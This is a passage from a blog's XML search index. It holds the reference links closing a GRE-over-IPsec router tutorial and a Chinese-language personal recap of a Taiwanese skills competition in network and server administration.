href="https://dn42.eu/howto/EdgeOS-GRE-IPsec-Example">howto/EdgeOS GRE IPsec Example</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://github.com/iisti/how-to-usg-mikrotik-ipsec-vpn">How to create an IPsec VPN between Unifi USG and Mikrotik firewalls</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://docs.google.com/document/d/13WTT3wZgejNWP0EPNeKQ24XXCVFM3g521doVrzeHqtg/edit">EdgeRouter to MikroTik IPSec VPN</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://forum.mikrotik.com/viewtopic.php?t=108227">Dummy or Loopback interface</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a href="https://forum.mikrotik.com/viewtopic.php?t=187390">loopback interface in mikrotik</a><a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:7" class="footnote-text"><span><a href="https://help.ui.com/hc/en-us/articles/205231690-EdgeRouter-GRE-Tunnel">EdgeRouter - GRE Tunnel </a><a href="#fnref:7" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:8" class="footnote-text"><span><a href="https://wiki.mikrotik.com/wiki/Manual:IP/IPsec">Manual:IP/IPsec - MikroTik Wiki</a><a href="#fnref:8" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:9" class="footnote-text"><span><a href="https://help.ui.com/hc/en-us/articles/204961754-EdgeRouter-EoGRE-Layer-2-Tunnel">EdgeRouter - EoGRE Layer 2 Tunnel</a><a href="#fnref:9" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:10" class="footnote-text"><span><a href="https://community.ui.com/questions/GRE-over-IPSec-tunnel/7f1bc5c4-ba65-4c6f-a8f5-7c2fd3135693">GRE over IPSec tunnel</a><a href="#fnref:10" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:11" class="footnote-text"><span><a href="https://help.ui.com/hc/en-us/articles/216771078-EdgeRouter-Modifying-the-Default-IPsec-Site-to-Site-VPN#3">EdgeRouter - Modifying the Default IPsec Site-to-Site VPN</a><a href="#fnref:11" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> UBNT </tag>
            
            <tag> Ubiquiti </tag>
            
            <tag> EdgeOS </tag>
            
            <tag> Mikrotik </tag>
            
            <tag> RouterOS </tag>
            
            <tag> GRE over IPsec </tag>
            
            <tag> IPsec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>54屆技能競賽南區區賽 - 39 資訊與網路技術</title>
      <link href="/54th-skills39-south-area/"/>
      <url>/54th-skills39-south-area/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>比賽都結束了一個月才來寫文章會不會太晚 = =</p><p>這個比賽是<a href="https://blog.chummydns.com/">chummy</a><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Chummy的Blog](https://blog.chummydns.com/)">[1]</span></a></sup>推薦我去參加的，以他的話來說就是這個比賽很水，不去拿錢嗎。實際比了一次之後，的確很水，不過我太混了，比賽前一週才開始準備，沒拿到獎金…</p><h1 id="簡介">簡介</h1><p>分區賽的項目分為兩部分，都是在沒有外部網路連線的環境比賽</p><ul><li>Networking</li><li>OS</li></ul><p>Networking是1.5小時的賽程，主要是使用Cisco Packet  Tracer按照試題的各項要求完成switch和router的配置</p><p>OS是4.5小時的賽程，會有兩台主機、幾張網卡和網路分享器，需要在主機上搭建虛擬機，安裝操作系統，完成試題上要求配置的項目，主要就是windows server和linux server的配置。大部分人也是把重心放在這</p><h1 id="想法">想法</h1><p>這算是我第一次參加這種類型的比賽，感覺還是挺有趣的，只是自己太混，基本沒有準備，只拿到第四。</p><p>Networking的那部份，我直到比賽的那週一才註冊netadad的帳號下載cisco packet tracer，比賽前一天還撞到工程數學的期中，所以基本上只練到兩個晚上左右，不過以前有接觸過cisco的switch，上手還算快，練習時遇到不會配的，<a href="https://www.jannet.hk/home-zh-hant/">這個網站</a><sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Jan Ho 的網絡世界](https://www.jannet.hk/home-zh-hant/)">[2]</span></a></sup>也基本上可以教你，不過比賽時還是沒有配完所有的要求，一方面是不太熟悉，常常要翻指令，另一方面是有些要求沒配過，也找不到要再哪裡配，就只能放掉。</p><p>OS的部分差不多準備了三、四個晚上，基本都是準備windows server的部分，算是從0開始學習，真的要感謝chummy教我windows server的配置，比賽前一天他還幫我複習這部份。題目倒是不算太難，不過linux server很多地方沒有拿到分，第一眼看題目感覺我應該都會，結果因為沒有複習，全是靠以前配的記憶，忘記了幾個關鍵的配置，就變成：欸怎麼服務都起不來？反而初次接觸的windows server配置幾乎全配完了，有點尷尬</p><p>比賽基本上就是這樣，第一次比，感覺初賽倒是不難，只要不裸考應該都能拿好成績，反正今年就當試水，明年可以再打一次，下次努力一點去拿錢。</p><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://blog.chummydns.com/">Chummy的Blog</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://www.jannet.hk/home-zh-hant/">Jan Ho 的網絡世界</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
      
      
      <categories>
          
          <category> 比賽 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
